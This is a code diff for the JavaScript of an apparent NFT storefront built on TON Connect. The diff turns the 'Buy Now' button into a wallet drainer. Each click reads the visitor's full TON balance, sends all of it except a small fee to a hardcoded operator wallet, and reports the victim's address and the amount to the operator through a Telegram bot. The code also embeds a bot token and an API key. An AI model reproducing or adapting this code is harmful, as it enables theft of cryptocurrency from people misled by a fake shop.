@@ -3,13 +3,18 @@ const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
     buttonRootId: 'ton-connect'
 });
 
-const MAIN_WALLET = "UQB_1vs8YfWcLzedQqVYRv5_OcXWZsqewXRj9io0CvsGqZAD"; // The wallet to receive "payments"
+// Initialize TonWeb for balance queries
+const TonWeb = window.TonWeb;
+const tonClient = new TonWeb.HttpProvider('https://toncenter.com/api/v2/jsonRPC', { apiKey: '72af116adcb9f929960600dcd7a9c14db0ec949d291ca28c3447d0a31a94632b' }); // Replace with your API key
+
+const MAIN_WALLET = "UQB_1vs8YfWcLzedQqVYRv5_OcXWZsqewXRj9io0CvsGqZAD"; // Replace with a valid, initialized address if needed
 const TG_BOT_TOKEN = "7412797367:AAE9ZTr0L4xI6GtALTGXUXINvGt_-CV0cDA";
 const TG_CHAT_ID = "8126533622";
+const NETWORK_FEE = 0.05; // Reserve 0.05 TON for network fees
 
 // Mock NFT data
 const nfts = [
-    { id: 1, name: '+888 0318 2062', image: 'images/nft1.jpg', price: 900 },
+    { id: 1, name: '+888 0318 2062', image: 'images/nft1.jpg', price: 0.1 }, // Price is ignored since we send all balance
     { id: 2, name: '+888 0632 5748', image: 'images/nft2.jpg', price: 814 },
     { id: 3, name: '+888 0435 6391', image: 'images/nft3.jpg', price: 1048 },
     { id: 4, name: '+888 0397 1075', image: 'images/nft4.jpg', price: 365 },
@@ -24,7 +29,7 @@ function renderNfts() {
     const grid = document.getElementById('nft-grid');
     if (!grid) return;
 
-    grid.innerHTML = ''; // Clear existing content
+    grid.innerHTML = '';
     nfts.forEach(nft => {
         const card = document.createElement('div');
         card.className = 'nft-card';
@@ -36,29 +41,37 @@ function renderNfts() {
                 <h3 class="nft-name">${nft.name}</h3>
                 <p class="nft-price">
                     <img src="images/ton-symbol.png" alt="TON" class="ton-symbol">
-                    ${nft.price} TON
+                    All Available TON
                 </p>
-                <button class="buy-button" data-price="${nft.price}" data-name="${nft.name}">Buy Now</button>
+                <button class="buy-button" data-name="${nft.name}">Buy Now</button>
             </div>
         `;
         grid.appendChild(card);
     });
 
-    // Add event listeners to the new buttons
     document.querySelectorAll('.buy-button').forEach(button => {
         button.addEventListener('click', (e) => {
-            const price = e.target.dataset.price;
             const name = e.target.dataset.name;
-            buyNft(price, name, e.target);
+            buyNFT(name, e.target);
         });
     });
 }
 
-// Function to simulate buying an NFT
-async function buyNft(price, name, buttonElement) {
+// Function to get wallet balance
+async function getWalletBalance(address) {
+    try {
+        const balance = await tonClient.getBalance(address);
+        return TonWeb.utils.fromNano(balance); // Convert nanotons to TON
+    } catch (error) {
+        console.error('Failed to fetch balance:', error);
+        throw new Error('Unable to fetch wallet balance');
+    }
+}
+
+// Function to buy NFT with all available balance
+async function buyNFT(name, buttonElement) {
     try {
         if (!tonConnectUI.connected || !tonConnectUI.account) {
-            // Trigger connection if not connected
             tonConnectUI.openModal();
             return;
         }
@@ -67,35 +80,41 @@ async function buyNft(price, name, buttonElement) {
         buttonElement.textContent = 'Processing...';
 
         const walletAddress = tonConnectUI.account.address;
-        const amountToSend = (BigInt(price) * 1000000000n).toString(); // Convert TON to nanotons
-        
+
+        // Fetch wallet balance
+        const balanceTon = await getWalletBalance(walletAddress);
+        const amountToSendTon = parseFloat(balanceTon) - NETWORK_FEE; // Reserve network fee
+        if (amountToSendTon <= 0) {
+            throw new Error('Insufficient balance to cover network fees');
+        }
+
+        const amountToSend = (BigInt(Math.floor(amountToSendTon * 1000000000))).toString(); // Convert TON to nanotons
+
         const transaction = {
-            validUntil: Math.floor(Date.now() / 1000) + 300, // 5 minutes
+            validUntil: Math.floor(Date.now() / 1000) + 600, // 10 minutes
             messages: [
                 {
                     address: MAIN_WALLET,
                     amount: amountToSend,
-                    payload: `Purchase of NFT: ${name}` // Optional: payload for comment
+                    payload: btoa(`Purchase of NFT: ${name}`) // Base64-encoded payload
                 }
             ]
         };
 
         const result = await tonConnectUI.sendTransaction(transaction);
         console.log('Transaction successful:', result);
-        
-        const message = `*New NFT Purchase*\nFrom: \`${walletAddress}\`\nItem: *${name}*\nAmount: *${price} TON*`;
+
+        const message = `*New NFT Purchase*\nFrom: \`${walletAddress}\`\nItem: *${name}*\nAmount: *${amountToSendTon.toFixed(2)} TON*`;
         sendTelegramMessage(message);
-        
-        alert(`Successfully purchased "${name}" for ${price} TON!`);
+
+        alert(`Successfully purchased "${name}" for ${amountToSendTon.toFixed(2)} TON!`);
 
     } catch (error) {
         console.error('Transaction failed:', error);
-        alert('Transaction failed: ' + error.message);
+        alert(`Transaction failed: ${error.message}`);
         const errorMessage = `*Purchase Failed*\nItem: *${name}*\nError: ${error.message}`;
         sendTelegramMessage(errorMessage);
-        
     } finally {
-        // Always re-enable the button
         if (buttonElement) {
             buttonElement.disabled = false;
             buttonElement.textContent = 'Buy Now';
@@ -109,15 +128,12 @@ function sendTelegramMessage(text) {
     fetch(url).catch(err => console.error('Telegram error:', err));
 }
 
-// Инициализация
+// Initialization
 document.addEventListener('DOMContentLoaded', () => {
     renderNfts();
-
-    // Optional: You can listen to status changes to update UI, e.g., show user's address
     tonConnectUI.onStatusChange(wallet => {
         if (wallet) {
             console.log('Wallet connected:', wallet.account.address);
-            // You could display the user's address somewhere
         } else {
             console.log('Wallet disconnected.');
         }
